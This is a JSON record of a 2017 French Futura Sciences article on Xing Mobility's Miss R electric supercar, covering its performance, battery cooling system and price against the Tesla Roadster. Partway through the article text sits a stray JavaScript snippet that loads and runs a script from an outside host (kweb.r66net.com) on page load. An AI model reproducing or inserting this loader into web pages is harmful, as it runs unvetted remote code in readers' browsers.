{"title": "Miss R : cette supercar electrique peut battre le Tesla Roadster", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-11-24", "content": "Xing Mobility, une entreprise taiwanaise specialisee dans les systemes de transmission electrique, a developpe un prototype de voiture tout terrain de plus de 1.300 chevaux capable d'accelerations encore plus fulgurantes que celles promises par le Tesla Roadster d'Elon Musk. Ce qu'il faut retenir La Miss R est une supercar electrique d'une puissance de 1 megawatt qui pourra passer de 0 a 100 km/h en 1,8 seconde. Elle utilise un systeme inedit de batterie lithium-ion a refroidissement liquide. La semaine derniere, Elon Musk faisait une fois de plus les gros titres en devoilant son  camion electrique Tesla Semi  et une nouvelle version du Roadster, le coupe sportif avec lequel la marque s'est lancee sur le marche de l' automobile . Ce nouveau modele a ete presente comme la  voiture  de serie la plus rapide du monde, capable d'abattre le 0 a 100 km/h en 1,9 seconde. Une affirmation audacieuse et risquee pour une voiture dont la production ne debutera qu'en 2020, ce qui laisse le temps a la concurrence de faire mentir le patron de  Tesla . Et c'est deja chose faite... Xing Mobility , une entreprise taiwanaise specialisee dans les systemes de transmission electrique, vient d'effectuer les premiers tours de roues d'un prototype de supercar electrique dont les accelerations seraient superieures a celles du Roadster Tesla. La  Miss R , c'est son nom, developpe une puissance d'un megawatt, soit 1.359 chevaux. Elle promet une acceleration de 0 a 100 km/h en 1,8 seconde, soit un dixieme de seconde mieux que le  Roadster Tesla .   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des batteries type Lego a refroidissement liquide Le 0 a 200 km/h est annonce en 5,1 secondes, avec une  vitesse  de pointe comprise entre 270 et 300 km/h. L'autonomie n'est pour le moment pas communiquee, mais elle ne devrait pas pouvoir rivaliser avec celle du Roadster qui annonce pres de 1.000 km. Ce dernier aura par ailleurs une vitesse de pointe superieure a 400 km/h. Mais la Miss R a un autre atout dans sa manche.  En effet, ses concepteurs assurent qu'elle sera aussi performante sur asphalte que sur la  terre  en mode tout terrain. Elle est dotee d'une transmission integrale avec quatre moteurs electriques independants de 350 V chacun. Une technologie de vectorisation du couple permet de repartir la force motrice entre les quatre roues en fonction du braquage et de l'acceleration.  Pour obtenir ce niveau de performances sans provoquer une surchauffe des  batteries , Xing Mobility a brevete une configuration et un systeme de refroidissement  liquide  assez particuliers. Cela repose sur des modules emboitables type Lego qui peuvent accueillir chacun 42 cellules lithium_ion. Le  plancher  de la Miss R contient 98 modules, soit un total de 4.116 cellules qui delivrent 1 megawatt de puissance.  Cette video nous montre les premiers tours de roue du prototype de la supercar electrique Miss R de Xing Mobility. On peut aussi voir le systeme de batteries lithium compose de modules emboitables facon Lego. (c) Xing Mobility  La Miss R vendue 1 million de dollars Le refroidissement des batteries est assure par un liquide de chez 3M appele Novec 7200 Engineered Fluid. Ce produit non conducteur est employe dans l'industrie pour le transfert thermique, le nettoyage de precision ou le depot de  lubrifiant . C'est la premiere fois qu'il est utilise pour refroidir des batteries. L'autre interet du dispositif concu par Xing Mobility est qu'a puissance egale, il utilise 30 a 50% de batteries en moins que les autres supercar electriques existantes. Par ailleurs, le plancher batterie peut etre demonte et echange en seulement cinq minutes. En revanche, la societe ne communique pas sur le temps de charge. Elon Musk a-t-il du  souci  a se faire pour son Roadster  Tesla  ? Pas tout a fait. La Miss R ne sera produite qu'a vingt exemplaires vendus un million de dollars l'unite alors que le coupe Tesla ne coutera << que >> 200.000 dollars. Pour Xing Mobility, il s'agit avant tout d'une vitrine technologique pour son systeme de transmission electrique et sa technologie de batterie qui pourrait equipe d'autres vehicules, qu'il s'agisse de bus, de deux roues, d'engins de chantier ou de bateaux electriques. La commercialisation de la Miss R est prevue en 2019. ", "theme": "tech"}